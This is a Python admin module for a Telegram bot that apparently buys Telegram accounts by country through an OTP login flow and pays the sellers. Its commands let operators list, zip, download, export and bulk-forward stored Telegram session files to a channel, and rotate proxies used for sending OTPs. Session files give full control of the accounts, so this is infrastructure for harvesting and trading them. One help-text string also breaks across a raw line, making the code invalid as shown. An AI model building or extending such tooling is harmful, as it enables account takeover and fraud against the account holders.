from bot_init import bot
from db import get_user
from config import ADMIN_IDS
from telegram_otp import session_manager
from utils import require_channel_membership
from session_sender import send_bulk_sessions_to_channel, create_session_zip_and_send, send_session_to_channel

import os

def is_admin(user_id):
    return user_id in ADMIN_IDS

@bot.message_handler(commands=['admin'])
@require_channel_membership
def handle_admin(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    response = "🔧 *ADMIN COMMAND CENTER* 🔧\n\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += "🛠️ *ADMINISTRATION PANEL* 🛠️\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    response += "*1️⃣ COUNTRY MANAGEMENT* 🌍\n"
    response += "• `/add <code> <qty> <price> <sec> [name] [flag]` - Add/update country\n"
    response += "• `/countries` - List all configured countries\n"
    response += "• `/cun <country_code> <quantity>` - Set country capacity\n"
    response += "• `/setprice <country_code> <price>` - Set country price\n"
    response += "• `/settime <country_code> <seconds>` - Set claim time\n"
    response += "• `/numberd <country_code>` - Remove country\n\n"
    
    response += "*2️⃣ PAYMENT & WITHDRAWALS* 💰\n"
    response += "• `/pay <user_id>` - Approve withdrawal for user\n"
    response += "• `/paycard <card_name>` - Approve all withdrawals for card\n"
    response += "• `/rejectpayment <user_id|card:name> [reason]` - Reject withdrawals\n"
    response += "• `/cardw <card_name>` - Check withdrawal stats for card\n"
    response += "• `/card <card_name>` - Add new leader card\n\n"
    
    response += "*3️⃣ USER MANAGEMENT* 👥\n"
    response += "• `/userdel <user_id>` - Delete user and all data\n"
    response += "• `/notice` - Send notification to all users\n"
    response += "• `/cleanusers` - Check for blocked users\n"
    response += "• `/removeblocked` - Remove blocked users\n\n"
    
    response += "*4️⃣ SESSION MANAGEMENT* 📱\n"
    response += "• `/sessions` - View session overview by country\n"
    response += "• `/sessionstats` - Detailed statistics\n"
    response += "• `/migratesessions` - Migrate legacy sessions\n"
    response += "• `/cleanupsessions` - Remove empty folders\n"
    response += "• `/exportsessions` - Export session info to JSON\n\n"
    
    response += "*5️⃣ SESSION DOWNLOAD & EXPORT* 📥\n"
    response += "• `/get +country_code [YYYYMMDD]` - Download sessions (zip)\n"
    response += "• `/getall [+country_code] [YYYYMMDD]` - Download all sessions\n"
    response += "• `/getinfo +country_code [YYYYMMDD]` - Get detailed info\n\n"
    
    response += "*6️⃣ SESSION CLEANUP* 🧹\n"
    response += "• `/deletesessions +country_code [YYYYMMDD]` - Delete sessions\n"
    response += "• `/cleansessionsall` - Delete all session files\n\n"
    
    response += "*7️⃣ DEVICE MONITORING* 📊\n"
    response += "• `/checkdevices +number` - Check device count\n"
    response += "• `/testdevicereward +number` - Test reward eligibility\n"
    response += "• `/devicestatus` - Show device security status\n"
    response += "• `/testfailmessage <language> +number` - Test failure messages\n\n"
    
    response += "*8️⃣ SESSION CHANNEL SENDING* 📤\n"
    response += "• `/sendsession +number` - Send specific session to channel\n"
    response += "• `/sendbulk [country_code] [max_files]` - Send multiple sessions\n"
    response += "• `/sendzip [country_code]` - Send sessions as ZIP file\n\n"
    
    response += "*9️⃣ PROXY MANAGEMENT* 🌐\n"
    response += "• `/proxystats` - Show proxy statistics\n"
    response += "• `/resetproxies` - Reset failed proxy list\n"
    response += "• `/reloadproxies` - Reload proxy configuration
• `/checkproxy` - Test proxy health manually\n\n"
    
    response += "*🔟 SYSTEM INFORMATION* ℹ️\n"
    response += "• `/admin` - Show this admin command list\n\n"
    
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += "🔐 *Admin Access: SUPER ADMIN | Total: 35 Commands*\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['sessions'])
def handle_sessions_command(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        sessions_by_country = session_manager.list_country_sessions()
        
        if not sessions_by_country:
            bot.reply_to(message, "📁 No sessions found")
            return
        
        response = "📊 **Session Overview by Country:**\n\n"
        total_sessions = 0
        
        for country_code, sessions in sessions_by_country.items():
            response += f"🌍 **{country_code}**: {len(sessions)} sessions\n"
            total_sessions += len(sessions)
        
        response += f"\n📈 **Total Sessions**: {total_sessions}"
        
        bot.reply_to(message, response, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['sessionstats'])
def handle_session_stats(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        sessions_by_country = session_manager.list_country_sessions()
        
        if not sessions_by_country:
            bot.reply_to(message, "📁 No sessions found")
            return
        
        response = "📊 **Session Statistics:**\n\n"
        
        for country_code, sessions in sessions_by_country.items():
            total_size = sum(session.get('size', 0) for session in sessions)
            avg_size = total_size / len(sessions) if sessions else 0
            
            response += f"🌍 **{country_code}**:\n"
            response += f"   📱 Sessions: {len(sessions)}\n"
            response += f"   💾 Total Size: {total_size:,} bytes\n"
            response += f"   📊 Average: {avg_size:.0f} bytes\n\n"
        
        bot.reply_to(message, response, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['migratesessions'])
def handle_migrate_sessions(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        # Import the migration function
        from session_manager import migrate_legacy_sessions
        
        bot.reply_to(message, "🔄 Starting session migration...")
        
        # Run migration
        migrate_legacy_sessions()
        
        bot.reply_to(message, "✅ Session migration completed!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['cleanupsessions'])
def handle_cleanup_sessions(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        # Import the cleanup function
        from session_manager import cleanup_empty_folders
        
        bot.reply_to(message, "🧹 Starting session cleanup...")
        
        # Run cleanup
        cleanup_empty_folders()
        
        bot.reply_to(message, "✅ Session cleanup completed!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['exportsessions'])
def handle_export_sessions(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        # Import the export function
        from session_manager import export_session_info
        
        bot.reply_to(message, "📄 Exporting session information...")
        
        # Run export
        export_session_info()
        
        bot.reply_to(message, "✅ Session export completed! Check the generated JSON file.")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ================ SESSION CHANNEL SENDING COMMANDS ================

@bot.message_handler(commands=['sendsession'])
def handle_send_session(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Usage: /sendsession +phone_number")
            return
        
        phone_number = args[1].strip()
        if not phone_number.startswith('+'):
            phone_number = '+' + phone_number
        
        bot.reply_to(message, f"📤 Sending session file for {phone_number}...")
        
        # Try to send the session
        success = send_session_to_channel(phone_number, 0, "admin", 0.0)
        
        if success:
            bot.reply_to(message, f"✅ Session file sent successfully for {phone_number}")
        else:
            bot.reply_to(message, f"❌ Failed to send session file for {phone_number}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['sendbulk'])
def handle_send_bulk_sessions(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        args = message.text.split()
        country_code = None
        max_files = 50
        
        if len(args) > 1:
            country_code = args[1].strip()
        if len(args) > 2:
            max_files = int(args[2])
        
        bot.reply_to(message, f"📤 Sending bulk sessions... (Max: {max_files})")
        
        sent_count = send_bulk_sessions_to_channel(country_code, max_files)
        
        if sent_count > 0:
            bot.reply_to(message, f"✅ Successfully sent {sent_count} session files to channel")
        else:
            bot.reply_to(message, "❌ No session files were sent")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['sendzip'])
def handle_send_session_zip(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        args = message.text.split()
        country_code = None
        
        if len(args) > 1:
            country_code = args[1].strip()
        
        bot.reply_to(message, "📦 Creating and sending session ZIP file...")
        
        success = create_session_zip_and_send(country_code)
        
        if success:
            bot.reply_to(message, "✅ Session ZIP file sent successfully to channel")
        else:
            bot.reply_to(message, "❌ Failed to create or send session ZIP file")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ================ PROXY MANAGEMENT COMMANDS ================

@bot.message_handler(commands=['proxystats'])
def handle_proxy_stats(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        from proxy_manager import proxy_manager
        stats = proxy_manager.get_proxy_stats()
        bot.reply_to(message, stats, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['resetproxies'])
def handle_reset_proxies(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        from proxy_manager import proxy_manager
        proxy_manager.reset_failed_proxies()
        
        bot.reply_to(message, 
            f"✅ *Proxy Reset Completed*\n\n"
            f"🔄 Failed proxy list has been cleared\n"
            f"📊 Available proxies: {len(proxy_manager.proxies)}\n"
            f"🌐 All proxies are now available for use\n"
            f"💡 Health status has been reset",
            parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['reloadproxies'])
def handle_reload_proxies(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        from proxy_manager import proxy_manager
        proxy_manager.load_proxies()
        
        response = f"🔄 *Proxy Configuration Reloaded*\n\n"
        response += f"📊 **Loaded Proxies**: {len(proxy_manager.proxies)}\n"
        response += f"❌ **Failed Proxies**: {len(proxy_manager.failed_proxies)}\n\n"
        
        if len(proxy_manager.proxies) > 0:
            response += "🌐 Proxy system is ready for OTP sending\n"
            response += "💡 Use /proxystats for detailed health information"
        else:
            response += "⚠️ No proxies loaded. Check PROXYLIST configuration."
        
        bot.reply_to(message, response, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['checkproxy'])
def handle_check_proxy(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        from proxy_manager import proxy_manager
        import asyncio
        
        # Send initial message
        bot.reply_to(message, "🔍 *Testing Proxy Health...*\n\nPlease wait while I check all configured proxies.", parse_mode="Markdown")
        
        async def test_all_proxies():
            results = []
            for i, proxy in enumerate(proxy_manager.proxies):
                proxy_key = f"{proxy['addr']}:{proxy['port']}"
                try:
                    health_result = await proxy_manager.check_proxy_health(proxy)
                    if health_result['working']:
                        status = f"✅ {proxy_key} - Healthy ({health_result['response_time']:.2f}s)"
                    else:
                        status = f"❌ {proxy_key} - Failed: {health_result.get('error', 'Unknown')}"
                    results.append(status)
                except Exception as e:
                    results.append(f"❌ {proxy_key} - Error: {str(e)}")
            
            response = "🔍 *Proxy Health Check Results*\n\n"
            response += "\n".join(results)
            response += f"\n\n📊 Summary: {len([r for r in results if r.startswith('✅')])} healthy, {len([r for r in results if r.startswith('❌')])} failed"
            
            bot.send_message(message.chat.id, response, parse_mode="Markdown")
        
        # Run the async function
        asyncio.run(test_all_proxies())
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")